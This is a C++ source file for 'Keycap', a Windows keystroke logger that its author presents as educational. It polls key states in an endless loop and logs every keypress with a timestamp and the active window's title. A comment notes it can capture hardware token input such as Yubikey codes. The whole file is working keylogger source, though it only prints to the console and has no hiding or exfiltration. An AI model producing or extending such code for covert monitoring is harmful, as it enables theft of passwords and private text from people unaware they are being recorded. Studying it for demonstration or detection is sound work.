/*
 * Copyright (c) 2015 Richard B Tilley <brad@w8rbt.org>
 *
 * Permission to use, copy, modify, and distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
 * ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
 * ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 *
 * Keycap - A simple keystroke logger for Windows intended
 *          for educational purposes and demonstration.
 *
 */


#include <chrono>
#include <cstdint>
#include <ctime>
#include <iostream>
#include <map>
#include <string>
#include <vector>

#include "main.hpp"


int main()
{
    std::map<std::int16_t, std::vector<std::string> > keys = vk();
    std::map<std::int16_t, std::vector<std::string> >::const_iterator keyit;
    
    // Windows handle & title
    HWND active_window;
    TCHAR window_title[2048];
    
    std::chrono::time_point<std::chrono::system_clock> two = std::chrono::system_clock::now();
    char tbuf[32];
    
    std::string character;
    
    std::int16_t key_state;
    bool shift;

    std::cout << "KEY|TIME|WINDOW" << "\n";
    
    while ( true )
    {       
        shift = false;
        active_window = GetForegroundWindow();      
        
        for( keyit = keys.begin(); keyit != keys.end(); ++keyit ) 
        {
            two = std::chrono::system_clock::now();
            std::time_t now = std::chrono::system_clock::to_time_t(two);
            std::strftime(tbuf, sizeof(tbuf), "%Y-%m-%dT%H:%M:%S", std::localtime(&now));

            key_state = GetAsyncKeyState( keyit->first );
            GetWindowText( active_window, window_title, 2048 );
            
            // Shift key is down. MSB is set.
            if ( key_state == -32768 && keyit->first == 16 )
            {
                shift = true;
            }
            
            // Key state has changed. LSB is set.
            if ( key_state == -32767 )
            {
                // Uppercase
                if ( shift )
                {
                    std::cout  << keyit->second[1] << "|" 
                               << tbuf             << "|\""; 
                    std::wcout << window_title     << "\"\n";
                    character =  keyit->second[1];
                }
                        
                // Lowercase
                else
                {
                    std::cout  << keyit->second[0] << "|"
                               << tbuf             << "|\""; 
                    std::wcout << window_title     << "\"\n";
                    character =  keyit->second[0];
                }
            }
        }

        // Sleep() requires WinXP or later (sleep 15 milliseconds)
        // Can be removed entirely to capture Yubikey, etc.
        // but may be CPU intensive
        Sleep(15);
    }
    
    return 0;
}

